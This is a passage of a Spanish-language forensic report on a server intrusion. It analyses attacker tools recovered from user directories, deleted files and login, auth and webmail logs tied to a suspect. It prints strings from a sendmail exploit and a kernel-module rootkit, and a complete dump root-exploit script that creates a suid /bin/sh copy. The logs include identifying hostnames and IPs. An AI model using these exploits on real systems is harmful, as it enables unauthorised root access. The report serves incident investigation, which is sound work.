[*] Victim = %s
[*] Depth  = %d
[*] Offset = %d
[*] Temp   = %s
[*] ESP    = 0x%08x
[-] Bad: %s isn't suid ;(
[-] Bad: We haven't access to %s !
[-] Can't create our tempdir!
[+] Created %s
objdump
%s -R %s | grep setuid
[-] Cannot get setuid() GOT
[+] Step 1. setuid() got = 0x%08x
%s/sm
[*] Step 2. Copying %s to %s...
/bin/cp -f %s %s
Failed
[*] Step 3. Disassembling %s...
grep
%s -d %s 2> /dev/null | %s -B %d "mov.*%%.l,(%%e..,%%e..,1)" | %s ".mov .*0x80.*,%%e.."
%s -d %s 2> /dev/null | %s ".mov .*0x80.*,%%e.."
%x: %s %s %s %s %s %s 0x%x,%s
OK, found %d targets
[*] Step 4. Exploiting %d targets:
%s/gdb
Cannot create gdb script
break *0x%x
r -d1-1.1
x/x 0x%x
%s -batch -x %s %s 2> /dev/null
Failed to spawn gdb!
0x%x %s 0x%x
[%d] (%d%% of targets) GOT=0x%08x, VECT=0x%08x, offset=%d
Thanx for choosing sd's products ;)
[-] All targets failed, probably not vulnerable ;(
/usr/sbin/sendmail
/tmp/.sxp
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Estos programas explotan vulnerabilidades del servidor de correo y
sirven para ganar acceso a root desde una cuenta no privilegiada. En
al 'ultima l'inea de \verb+ex/sd+ se hace referencia a \verb+/tmp/.sxp+ que es uno de
los programas que se encontr'o en el historial de duende como utilizado
por el.\\

 Veremos ahora el contenido de los archivos del directorio de duende:
 

\verb+oOo.tar+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
?-rw-------  1 root     root        2086 Dec  5  2002 S8EXP                                                                                  ?
?-rwxr-xr-x  1 root     root        9320 Nov  7  2002 final                                                                                  ?
?-rw-------  1 root     root        2987 Dec  5  2002 final.c                                                                                ?
?-rw-------  1 root     root        1947 Dec  5  2002 flkm.c                                                                                 ?
?-rw-r--r--  1 root     root       78450 Nov  7  2002 flkm32                                                                                 ?
?-rw-r--r--  1 root     root       68352 Nov  7  2002 flkm64
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 
 Este es id'enticamente el mismo que el oOo.tar que esta en el
 directorio proa.\\


 Contenido del archivo llamado \verb+final+:
 

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
 /usr/lib/ld.so.1
system
_GLOBAL_OFFSET_TABLE_
_init
printf
_edata
exit
getpppid
environ
getpid
close
_Jv_RegisterClasses
_PROCEDURE_LINKAGE_TABLE_
_DYNAMIC
__dso_handle
strcpy
sprintf
_start
write
getuid
atexit
_environ
execl
mkdir
open
_etext
__priocntl
memset
main
__register_frame_info
atoi
__deregister_frame_info
free
_end
malloc
read
_lib_version
lseek
_fini
_exit
Load
libc.so.1
SUNW_0.7
libc.so.1
/proc/%d/psinfo
../../../tmp/flkm32
../../../tmp/flkm64
is 64 bit: %d
cp -f flkm32 /tmp/flkm32
/tmp/sparcv9
cp -f flkm64 /tmp/sparcv9/flkm64
/tmp/flkm32
/tmp/sparcv9/flkm64
%d bytes to write
%d bytes wroten
err! open flkm error!
id=%d
rm -fr /tmp/flkm32
rm -fr /tmp/sparcv9
SUCCESS! Enjoy RootShell!
/bin/sh
fail!
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Este es el contenido de un exploit de sendmail.\\
 
 
 Contenido de \verb+dump.sh+:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim} 
#!/bin/sh

# Redhat 6.2 dump command executes external program
# with suid priviledge.
# Discovered by Mat <mat@hacksware.com>
# Written for and by a scriptkid Tasc ;P
# Remember, there's no cure for BSE

echo "dump-0.4b15 root exploit"
echo "Discovered by Mat <mat@hacksware.com>"
echo "-------------------------------------"
echo
DUMP=/sbin/dump
if [ ! -u $DUMP ]; then
  echo "$DUMP is NOT setuid on this system or does not exist at all!"
  echo
  exit 0
fi
export TAPE=iamlame:iamlame
export RSH=/tmp/rsh
cat >/tmp/rsh <<__eof__
#!/bin/sh
cp /bin/sh /tmp/sush
chmod 4755 /tmp/sush
}
__eof__
chmod 755 /tmp/rsh
/sbin/dump -0 /
echo
echo "Waiting for rootshell .... 5 seconds...."
sleep 5
/tmp/sush
id
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Es el contenido de un script que da acceso a un {\bf shell} de root de
 forma no autorizada.\\
 

 Los directorios y archivos \verb+emech+, \verb+psybnc+ y \verb+eggdrop+ son de paquetes
que ejecutan un servidor de {\bf irc} y contienen servidores de \verb+ftp+ y
\verb+telnet+. El contenido de estos directorios es el siguiente:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
drwxr-xr-x  3 1040     1040        4096 Apr 23 22:33 ..                                                                                     ?
?drwxr-xr-x  2 1040     1040        4096 Oct 21  2000 help                                                                                   ?
?drwxr-xr-x  2 1040     1040        4096 Apr 23 22:34 log                                                                                    ?
?drwxr-xr-x  3 1040     1040        4096 Oct 21  2000 menuconf                                                                               ?
?drwxr-xr-x  2 1040     1040        4096 Apr 23 22:42 motd                                                                                   ?
?drwxr-xr-x  3 1040     1040        4096 Jul 30  2000 scripts                                                                                ?
?drwxr-xr-x  2 1040     1040        4096 Oct 21  2000 tools                                                                                  ?
?-rw-r--r--  1 1040     1040       18124 Oct 28  2000 CHANGES                                                                                ?
?-rw-------  1 1040     1040       17982 May 16  1997 COPYING                                                                                ?
?-rw-r--r--  1 1040     1040        2660 Aug  8  2000 FAQ                                                                                    ?
?-rw-r--r--  1 1040     1040         394 Oct 28  2000 Makefile                                                                               ?
?-rw-r--r--  1 1040     1040       36075 Oct 28  2000 README                                                                                 ?
?-rw-r--r--  1 1040     1040          76 Oct 28  2000 TODO                                                                                   ?
?-rwxr-xr-x  1 1040     1040      537712 Apr 23 22:33 in.ftpd                                                                                ?
?-rw-------  1 1040     1040         716 Apr 23 22:42 psybnc.conf                                                                            ?
?-rw-------  1 1040     1040         716 Apr 23 22:42 psybnc.conf.old                                                                        ?
?-rw-------  1 1040     1040           7 Apr 23 22:33 psybnc.pid                                                                             ?
?-rwxr-xr-x  1 1040     1040         369 Aug  8  2000 psybncchk
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 El objeto de estos programas es ofrecer el servicio de charlas en l'inea {\bf irc} para la red
{\bf UNDERnet}. El sembrar estos servidores es una actividad extremadamente com'un, 
y generalmente quienes la realizan no buscan controlar el sistema u obtener
informaci'on privada como en este caso, solo usan las m'aquinas para
colocar sus servidores y despu'es de poco tiempo migran a otros equipos
sin dejar rastro o recolectar informaci'on. No ser'an estudiados
estos servicios en el presente reporte, solo se mencionar'a lo que sea de inter'es
directo con la intrusi'on y sustracci'on de informaci'on confidencial.
 


\subsection*{Recuperaci'on de archivos eliminados del sistema}


 Se recupero el contenido de archivos en el disco duro que fueron
borrados por cualquier m'etodo y que no han sido sobreescritos aun.  Se
usaron diversas t'ecnicas de recuperaci'on de datos entre ellas el barrido directo 
de todos los bits en el disco. Gran parte de la
informaci'on borrada no pudo extraerse ya que el servidor ten'ia un uso
muy intenso y el remplazo de los bloques de datos es casi inmediato. De los
archivos que no se pueden recuperar por medios est'andar, se obtuvo el
nombre almacenado del archivo y se hizo un an'alisis de la cantidad inform'atica llamada entrop'ia 
de los bits en
los bloques del disco duro, con el fin de poder concatenar datos dispersos y
reconstruir alg'un archivo que pudiera ser de inter'es. Esta 'ultima
prueba fue realizada en ciertos archivos, pero su gran consumo de tiempo la descart'o como
m'etodo de an'alisis general.


 Archivos sospechosos de entre 300,000 recuperados.

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
r / r	/dev/zqft4/algo	          2003.05.10 00:05:03 (cst)	2003.05.10 00:05:03 (cst)	
                                2003.05.10 00:05:09 (cst)	0	0	0	532496 (realloc)

s / s	   	/dev/log              2003.05.08 22:23:03 (cst)	   	2003.05.08 22:23:03 (cst)	   	
                                2003.05.10 03:00:57 (cst)	   	0	   	0	   	0
                                305889

d / r	   	/tmp/.sxp             2003.04.08 13:02:52 (cst)	   	2003.05.09 12:25:06 (cst)	   	
                                2003.04.23 22:34:05 (cst)	   	475738	   	0	   	0	   	
                                130441 (realloc)

r / r  	    	sh                 2003.04.15 21:39:50 (cst)  	    	2003.04.26 16:00:32 (cst)  	    	
                                2003.04.15 22:29:00 (cst)  	    	466184  	    	523  	    	
                                523  	   	786702 (realloc)

f / r  	    	mc.pipe.12891      2003.03.08 12:13:10 (cst)  	    	2003.05.08 03:01:44 (cst)  	    	
                                2003.04.11 20:55:39 (cst)  	    	69  	    	500  	    	100  	   	
                                130461 (realloc)
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Los archivos anteriores son logs del sistema y ejecutables de {\bf irc}. Lo
que es de destacar es la existencia de un archivo llamado \verb+algo+.
Parece ser que \verb+algo+ fue una prueba de control. La palabra \verb+algo+
esta en espa�ol por lo que podemos decir que la instalaci'on fue hecha
por un hispano parlante. \verb+/tmp.sxp+ fue recuperado pero parece ser que
esta ligado al exploit completo del \verb+sendmail+ en el directorio \verb+/ex+.\\
  

 \verb+mc.pipe.1281+ es un archivo temporal propiedad del usuario duende y
contiene referencias de un script ejecutado desde mc por el mismo usuario.\\

 Su contenido es el siguiente:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
linux
sysinit
dnsquery
identd
plogd
db
sh
.tree
screen
popclean
ecko
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Esto muestra claramente que el el 11 de abril, el usuario duende
ejecut'o desde el \verb+midnight commander+ varios de los programas que
estamos estudiando. Recordemos que estos son archivos eliminados y
recuperados para esta investigaci'on.


\subsection*{Correlaci'on con otros sistemas involucrados}


 \verb+victima2+ se revis'o con minuciosidad pero solo ser'an inclu'idos los datos
 que est'en relacionados con el caso \verb+victima1+.\\


 Programas sospechosos en el directorio \verb+duende/+ en \verb+victima2+.
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
-rw-r--r--  1 500      500        61440 Apr 21 20:37 test.tar
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Contenido del paquete \verb+test.tar+:\\
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim} 
drwx------ scott/users       0 2002-02-08 07:09:51 ex/
-rwx------ scott/users   14361 2002-02-08 07:09:35 ex/ep
-rwx------ scott/users   14543 2002-02-08 07:09:39 ex/rh
-rwx------ scott/users   23577 2002-02-08 07:09:45 ex/sd
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Este archivo contiene los exploits para \verb+sendmail+ y es id'enticamente el
 mismo que el del directorio \verb+zena/+.
 
 En el directorio \verb+temp/+ de duende se encontr'o el directorio borrado
\verb+ex/+, lo cual confirma que el usuario lo desempaquet'o y despu'es lo
elimino. Adem'as de hallarse un archivo borrado \verb+o0o.tar+ con el mismo
{\bf md5sum} de los encontrados en \verb+zena/+, \verb+proa/+ y dem'as directorios
estudiados.

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
d / d  	    	ex/  	    	2002.11.27 20:51:02 (cst)  	    	2003.04.27 12:29:51 (cst)  	    	
                        2003.04.23 00:39:37 (cst)  	    	4096  	    	512  	    	
                        512  	   	999703 (realloc)
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm


 Bit'acoras en \verb+victima2+.\\

 
\verb+wtmp+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
duende  pts/7        Mon Apr 28 04:46 - 04:47  (00:00)     dsl-200-67-75-92.prodigy.net.mx
duende  pts/6        Mon Apr 28 04:44 - 04:46  (00:02)     dsl-200-67-75-92.prodigy.net.mx
duende  pts/6        Sun Apr 27 23:23 - 23:38  (00:14)     dsl-200-67-75-92.prodigy.net.mx
duende  pts/1        Sun Apr 27 19:10 - 20:14  (01:03)     dsl-200-67-75-92.prodigy.net.mx
duende  pts/0        Sun Apr 27 16:34 - 16:39  (00:04)     dsl-200-67-75-92.prodigy.net.mx
duende  pts/0        Sun Apr 27 16:11 - 16:14  (00:03)     dsl-200-67-75-92.prodigy.net.mx
duende  pts/0        Sun Apr 27 05:24 - 05:35  (00:10)     dsl-200-78-118-164.prodigy.net.mx
reboot   system boot  Sun Apr 27 05:19         (1+07:19)    2.4.18-686-smp
reboot   system boot  Sun Apr 27 05:12          (00:03)     2.4.18-686-smp
reboot   system boot  Sun Apr 27 05:09          (00:06)     2.4.18-686-smp
reboot   system boot  Sat Apr 26 07:00          (00:57)     2.4.18-686-smp
duende  pts/9        Sat Apr 26 05:14 - 05:51  (00:37)     dsl-200-67-75-160.prodigy.net.mx
duende  pts/4        Sat Apr 26 03:10 - 03:12  (00:02)     dsl-200-67-75-160.prodigy.net.mx
duende  pts/3        Sat Apr 26 03:09 - 03:20  (00:11)     dsl-200-67-75-160.prodigy.net.mx
duende  pts/3        Fri Apr 25 22:53 - 23:15  (00:22)     dsl-200-67-75-55.prodigy.net.mx
duende  pts/11       Fri Apr 25 21:23 - 21:28  (00:04)     dsl-200-67-75-55.prodigy.net.mx
duende  pts/8        Fri Apr 25 19:09 - 19:16  (00:07)     dsl-200-67-75-55.prodigy.net.mx
duende  pts/3        Fri Apr 25 19:07 - 19:17  (00:10)     dsl-200-67-75-55.prodigy.net.mx
duende  pts/7        Fri Apr 25 16:49 - 16:53  (00:04)     dsl-200-67-75-55.prodigy.net.mx
duende  pts/4        Fri Apr 25 15:17 - 16:53  (01:36)     dsl-200-67-75-55.prodigy.net.mx
duende  pts/3        Fri Apr 25 15:15 - 16:49  (01:34)     dsl-200-67-75-55.prodigy.net.mx
duende  pts/3        Fri Apr 25 06:10 - 06:25  (00:14)     dsl-200-67-75-49.prodigy.net.mx
duende  pts/6        Fri Apr 25 00:22 - 00:30  (00:07)     dsl-200-67-75-49.prodigy.net.mx
duende  pts/4        Thu Apr 24 21:35 - 21:39  (00:04)     dsl-200-67-75-49.prodigy.net.mx
duende  pts/2        Thu Apr 24 19:06 - 19:27  (00:20)     dsl-200-67-75-49.prodigy.net.mx
duende  pts/0        Thu Apr 24 19:03 - 19:05  (00:02)     dsl-200-67-75-49.prodigy.net.mx
duende  pts/2        Thu Apr 24 17:53 - 17:55  (00:02)     dsl-200-67-75-49.prodigy.net.mx
duende  pts/0        Thu Apr 24 15:11 - 15:14  (00:02)     dsl-200-67-75-49.prodigy.net.mx
duende  pts/6        Thu Apr 24 05:34 - 05:49  (00:15)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/5        Thu Apr 24 05:28 - 05:49  (00:21)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/0        Thu Apr 24 05:05 - 05:08  (00:03)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/0        Thu Apr 24 02:23 - 02:26  (00:02)     ifm1.foo.bar.mx
reboot   system boot  Thu Apr 24 02:22         (2+05:35)    2.4.18-686-smp
duende  pts/3        Thu Apr 24 00:03 - 00:35  (00:32)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/2        Wed Apr 23 23:51 - 00:34  (00:43)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/1        Wed Apr 23 23:21 - 23:28  (00:07)     dsl-200-67-75-152.prodigy.net.mx
lllll pts/0        Wed Apr 23 22:26 - 22:33  (00:07)     dup-200-64-59-99.prodigy.net.mx
duende  pts/5        Wed Apr 23 19:56 - 20:07  (00:11)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/0        Wed Apr 23 17:11 - 17:13  (00:02)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/1        Wed Apr 23 06:44 - 06:44  (00:00)     dsl-200-78-118-98.prodigy.net.mx
duende  pts/0        Wed Apr 23 04:10 - 04:25  (00:15)     dsl-200-78-118-98.prodigy.net.mx
duende  pts/0        Wed Apr 23 00:09 - 00:11  (00:01)     dsl-200-78-118-98.prodigy.net.mx
duende  pts/3        Tue Apr 22 20:47 - 20:52  (00:04)     dsl-200-78-118-98.prodigy.net.mx
duende  pts/0        Tue Apr 22 16:51 - 17:41  (00:50)     dsl-200-78-118-98.prodigy.net.mx
duende  pts/0        Tue Apr 22 15:02 - 15:12  (00:10)     dsl-200-78-118-98.prodigy.net.mx
duende  pts/0        Tue Apr 22 05:47 - 06:01  (00:14)     dsl-200-78-118-51.prodigy.net.mx
duende  pts/1        Tue Apr 22 02:41 - 02:56  (00:14)     dsl-200-78-118-51.prodigy.net.mx
duende  pts/0        Mon Apr 21 23:36 - 23:38  (00:02)     dsl-200-78-118-51.prodigy.net.mx
duende  pts/1        Mon Apr 21 22:08 - 22:16  (00:07)     dsl-200-78-118-51.prodigy.net.mx
duende  pts/7        Mon Apr 21 21:36 - 22:00  (00:24)     dsl-200-78-118-51.prodigy.net.mx
duende  pts/3        Mon Apr 21 21:24 - 21:58  (00:34)     dsl-200-78-118-51.prodigy.net.mx
lllll pts/0        Mon Apr 21 20:35 - 22:49  (02:13)     dup-200-64-234-196.prodigy.net.mx
duende  pts/0        Mon Apr 21 18:38 - 18:40  (00:01)     dsl-200-78-118-51.prodigy.net.mx
duende  pts/0        Mon Apr 21 17:01 - 17:01  (00:00)     dsl-200-78-118-51.prodigy.net.mx
duende  pts/0        Mon Apr 21 07:26 - 07:30  (00:03)     dsl-200-67-75-99.prodigy.net.mx
duende  pts/1        Mon Apr 21 03:54 - 03:55  (00:00)     dsl-200-67-75-99.prodigy.net.mx
duende  pts/0        Mon Apr 21 00:38 - 00:40  (00:01)     dsl-200-67-75-99.prodigy.net.mx
duende  pts/0        Sun Apr 20 16:07 - 16:40  (00:32)     dsl-200-67-75-99.prodigy.net.mx
duende  pts/0        Sun Apr 20 05:43 - 05:45  (00:01)     dsl-200-67-75-109.prodigy.net.mx
duende  pts/0        Sun Apr 20 02:22 - 02:30  (00:07)     dsl-200-67-75-109.prodigy.net.mx
reboot   system boot  Sun Apr 20 00:10         (4+02:09)    2.4.18-686-smp
duende  pts/0        Sat Apr 19 21:48 - 22:04  (00:15)     dsl-200-67-75-109.prodigy.net.mx
duende  pts/0        Sat Apr 19 16:15 - 16:16  (00:01)     dsl-200-67-75-109.prodigy.net.mx
duende  pts/0        Sat Apr 19 07:25 - 07:25  (00:00)     dsl-200-78-118-131.prodigy.net.mx
duende  pts/0        Sat Apr 19 05:10 - 05:11  (00:00)     dsl-200-78-118-131.prodigy.net.mx
duende  pts/0        Sat Apr 19 00:31 - 00:36  (00:05)     dsl-200-78-118-131.prodigy.net.mx
duende  pts/1        Fri Apr 18 21:01 - 21:17  (00:15)     200.78.118.131
duende  pts/1        Fri Apr 18 15:06 - 15:09  (00:03)     dsl-200-78-118-131.prodigy.net.mx
duende  pts/7        Fri Apr 18 06:00 - 06:23  (00:22)     dsl-200-67-75-78.prodigy.net.mx
duende  pts/5        Fri Apr 18 02:05 - 02:06  (00:00)     dsl-200-67-75-78.prodigy.net.mx
duende  pts/5        Thu Apr 17 22:04 - 22:07  (00:02)     dsl-200-67-75-78.prodigy.net.mx
duende  pts/0        Thu Apr 17 17:52 - 17:53  (00:00)     dsl-200-67-75-78.prodigy.net.mx
duende  pts/0        Thu Apr 17 15:00 - 15:01  (00:01)     dsl-200-67-75-78.prodigy.net.mx
duende  pts/4        Thu Apr 17 05:49 - 05:50  (00:01)     dsl-200-78-118-61.prodigy.net.mx
duende  pts/2        Thu Apr 17 05:48 - 05:51  (00:02)     dsl-200-78-118-61.prodigy.net.mx
duende  pts/3        Thu Apr 17 02:46 - 02:49  (00:02)     dsl-200-78-118-61.prodigy.net.mx
duende  pts/0        Thu Apr 17 00:26 - 00:41  (00:15)     dsl-200-78-118-61.prodigy.net.mx
reboot   system boot  Wed Apr 16 23:54         (3+00:14)    2.4.18-686-smp
proa     pts/4        Wed Apr 16 20:49 - 20:51  (00:01)     dup-200-64-59-111.prodigy.net.mx
duende  pts/4        Wed Apr 16 20:15 - 20:23  (00:07)     dsl-200-78-118-61.prodigy.net.mx
zopilote pts/5        Wed Apr 16 20:05 - 20:08  (00:03)     dup-200-64-59-111.prodigy.net.mx
reboot   system boot  Wed Apr 16 19:15          (04:36)     2.4.18-686-smp
duende  pts/0        Wed Apr 16 15:54 - 16:15  (00:20)     dsl-200-78-118-61.prodigy.net.mx
duende  pts/2        Wed Apr 16 15:25 - 15:40  (00:15)     dsl-200-78-118-61.prodigy.net.mx
duende  pts/0        Wed Apr 16 15:15 - 15:40  (00:25)     dsl-200-78-118-61.prodigy.net.mx
duende  pts/3        Wed Apr 16 05:01 - 05:28  (00:26)     dsl-200-78-118-156.prodigy.net.mx
duende  pts/5        Wed Apr 16 04:56 - 05:28  (00:31)     dsl-200-78-118-156.prodigy.net.mx
duende  pts/2        Wed Apr 16 03:07 - 04:36  (01:29)     dsl-200-78-118-156.prodigy.net.mx
duende  pts/0        Wed Apr 16 03:02 - 04:36  (01:34)     dsl-200-78-118-156.prodigy.net.mx
proa     pts/1        Wed Apr 16 00:38 - 00:47  (00:08)     host-200.77.149.89-cust.telemedia.net.mx
duende  pts/1        Wed Apr 16 00:16 - 00:27  (00:10)     dsl-200-78-118-156.prodigy.net.mx
duende  pts/2        Wed Apr 16 00:05 - 00:28  (00:23)     dsl-200-78-118-156.prodigy.net.mx
proa     pts/2        Wed Apr 16 00:01 - 00:01  (00:00)     host-200.77.149.89-cust.telemedia.net.mx
zopilote pts/8        Tue Apr 15 22:57 - 23:00  (00:02)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/7        Tue Apr 15 22:17 - 00:23  (02:05)     host-200.77.149.89-cust.telemedia.net.mx
reboot   system boot  Tue Apr 15 20:28          (22:43)     2.4.18-686-smp
proa     pts/4        Fri Apr 11 21:35 - 21:44  (00:09)     dup-200-64-234-32.prodigy.net.mx
proa     pts/8        Wed Apr  9 20:28 - 20:33  (00:04)     host-200.77.144.172-cust.telemedia.net.mx
zopilote pts/0        Sun Apr  6 01:29 - 01:29  (00:00)     host-200.77.150.221-cust.telemedia.net.mx
zopilote pts/1        Fri Apr  4 21:24 - 21:28  (00:04)     dup-200-64-239-107.prodigy.net.mx
reboot   system boot  Fri Apr  4 21:00         (11+22:11)   2.4.18-686-smp
zopilote pts/1        Fri Apr  4 01:27 - 01:32  (00:04)     dup-200-64-234-43.prodigy.net.mx
zopilote pts/1        Wed Apr  2 03:05 - 03:06  (00:00)     gobmorelia34.terra.net.mx
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Se puede observar que los accesos de \verb+zopilote+, \verb+zena+, \verb+proa+ y \verb+lllll+
es desde m'aquinas dsl de prodigy, telemedia y terra, todas estas
m'aquinas est'an ubicadas en la ciudad de Morelia. Es de destacar que
cuando se bloquea el acceso a varias cuentas involucradas, es que
aparecen los accesos de duende quien no ingres'o al equipo por mucho tiempo.

 Los ingresos del usuario \verb+duende+ desde \verb+victima2+ hacia \verb+victima1+ se
confirman en las bit'acoras de \verb+victima2+, y se autentifica que provienen de
una conexi'on dsl de prodigy infinitum.

\subsection*{Bit'acoras en el servidor de correo}
 

 El servidor de correo es victima3.foo.bar.mx, esta m'aquina provee acceso
\verb+pop+, \verb+imap+ y \verb+web+ a sus usuarios pero no permite accesos directos al
{\bf shell} como se explicar'a m'as adelante.\\
 
 
\verb+authlog+
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim} 
Apr 18 22:37:42 io imapd[29834]: Login failed user=duende auth=duende 
				host=dsl-200-78-118-131.prodigy.net.mx [200.78.118.131]
Apr 18 22:37:45 io imapd[29834]: Login failed user=duende 
                                 auth=duende host=dsl-200-78-118-131.prodigy.net.mx [200.78.118.131]
Apr 22 06:18:01 io sshd[13560]: Accepted password for yyyyy from xxx.xxx.xxx.2 port 33455 ssh2
Apr 22 06:18:08 io su: BAD SU yyyyy to root on /dev/ttyp0
Apr 22 06:18:18 io su: BAD SU yyyyy to root on /dev/ttyp0
Apr 22 06:18:47 io sshd[5397]: Failed password for duende from xxx.xxx.xxx.2 port 33456 ssh2
Apr 22 06:18:52 io last message repeated 2 times
Apr 22 06:18:52 io sshd[5397]: Connection closed by xxx.xxx.xxx.2
Apr 22 08:00:01 io newsyslog[1695]: logfile turned over
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Estas l'ineas muestran intentos de acceso desde una cuenta dsl de
prodigy buscando entrar como el usuario duende a la m'aquina del
correo.  El d'ia 22 se obtiene un acceso limpio a la cuenta yyyyy por
medio del servicio {\bf ssh}. El intruso intenta volverse root en la m'aquina
con el comando su pero falla en dos intentos, mientras al mismo tiempo
desde \verb+victima2+, trata de ingresar como duende pero falla de nuevo. En seguida
cierra la conexi'on establecida con \verb+admin+.\\

Las l'ineas anteriores son muy reveladoras porque esa m'aquina no tiene
acceso remoto a {\bf shell} sino solo por medio de la cuenta \verb+admin+, 
y para ser \verb+root+ hay que
hacer \verb+su+ dentro del equipo con el password respectivo. Esa
caracter'istica solo la conoc'ian dos personas en el mundo: \verb+root+ y
\verb+duende+. Nadie mas sabia que la cuenta \verb+admin+ exist'ia y que hab'ia que
ingresar a ella para ser \verb+root+. Adem'as el acceso es limpio y no hay
modo de adivinar la clave sin millones de intentos. El acceso a estas
cuentas y el intento de hacerse \verb+root+ en la m'aquina esta solo permitido
para el administrador, y nadie mas tiene permiso ni siquiera de intentarlo. Sean
cuales sean sus intenciones esto es una nueva intrusi'on. Hay que mencionar
que con anterioridad estaba permitido el acceso a la cuenta de
\verb+duende+ a \verb+victima3.foo.bar.mx+ pero fue bloqueada y reducida a una cuenta normal sin
haber raz'on alguna para informarle al usuario. Es de explicar
entonces los intentos de acceder a la cuenta duende, pero nunca a
proa, zena o cualquier otra posible. Los intentos son directos y
limpios.\\


\subsubsection{Revisi'on de la actividad dentro del programa lector de correo}

 Open Web Mail es el lector de correo usado por muchos de los usuarios. Se revis'o
la actividad dentro de este programa con el fin de correlacionar eventos y buscar nueva informaci'on.\\  

\verb+openwebmail.log+\\

Selecci'on de entre 15,420 accesos.
 \vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}

Tue Apr  8 06:51:31 2003 - [21991] (200.78.118.87) duende - login - duende-session-0.85733055121182
Tue Apr  8 06:51:33 2003 - [16219] (200.78.118.87) duende - filtermsg - filter 1 msgs from INBOX
Tue Apr  8 06:52:16 2003 - [8462] (200.78.118.87) duende - movemsg - move 9 msgs from INBOX to mail-trash 
	- ids=<001610c2bb47$bdb36637$51032137@onwbjdw.oex>, 
	<c1r2qllj8x3ka.5cb8hg3ii20l6h6n5x._57@yahoo.com>, <200304080955.h389tLBc018615@victima3.foo.bar.mx>, 
	<4H7ETX0.94Q6JR4H018."Promocion Mexico Sony VAIO aqui"<chernoyarskaya@mail.ru>>, 
	<2809026542djxvwlqClw}ho1lip1xplfk1p{@nagani.com>, <2043026365djxvwlqCjlqhwwh1lip1xplfk1p
	{@americaradioclub.org>, <E192nk7-0002fh-02@sc8-osdn-mail.osdn.com>, 
	<036e12b54a6d$2684b3d3$7bd77da0@qdsndr>, <E192n45-0004pw-00@victima2.foo.bar.mx>
Tue Apr  8 06:52:35 2003 - [24192] (200.78.118.87) duende - movemsg - move 4 msgs from INBOX to 
	mail-trash - ids=<E192ljk-0004qN-00@sc8-osdn-mail.osdn.com>, 
	<E192lKG-0004aA-00@victima2.foo.bar.mx>, <E192kFr-00088T-00@victima1.com>, 
	<20030408033153.KLJM6704.apk01fe2@GERENCIA>
Tue Apr  8 06:53:06 2003 - [16123] (200.78.118.87) duende - movemsg - move 1 msgs from INBOX to 
	mail-trash - ids=<E192lzi-0008HC-00@victima1.com>
Tue Apr  8 06:53:08 2003 - [2350] (200.78.118.87) duende - logout - duende-session-0.85733055121182
Tue Apr  8 09:56:57 2003 - [25378] (200.78.118.87) duende - login - duende-session-0.859352042506547
Tue Apr  8 09:57:26 2003 - [14434] (200.78.118.87) duende - movemsg - move 3 msgs from INBOX to 
	mail-trash - ids=<2403774.1049816969625.JavaMail.root@abv-sfo1-ac-agent5>, 
	<E192vIl-000651-00@victima2.foo.bar.mx>, <1049807435.26990@moses.rbmailsystems.com>
Tue Apr  8 09:58:00 2003 - [31053] (200.78.118.87) duende - movemsg - move 1 old msgs from INBOX to 
	saved-messages
Tue Apr  8 09:58:00 2003 - [31053] (200.78.118.87) duende - logout - duende-session-0.859352042506547
Tue Apr  8 14:54:51 2003 - [10597] (200.78.118.87) duende - login - duende-session-0.0548009612402929
Tue Apr  8 14:54:52 2003 - [13509] (200.78.118.87) duende - filtermsg - filter 1 msgs from INBOX
Tue Apr  8 14:55:08 2003 - [19952] (200.78.118.87) duende - movemsg - move 7 msgs from INBOX to 
	mail-trash - ids=<E1930Tg-0007GW-00@victima2.foo.bar.mx>, 
	<000800a4ec12$bea71047$28087016@vpnneci.faf>, <001811e7ae13$ead17075$35641188@nulrggp.ime>, 
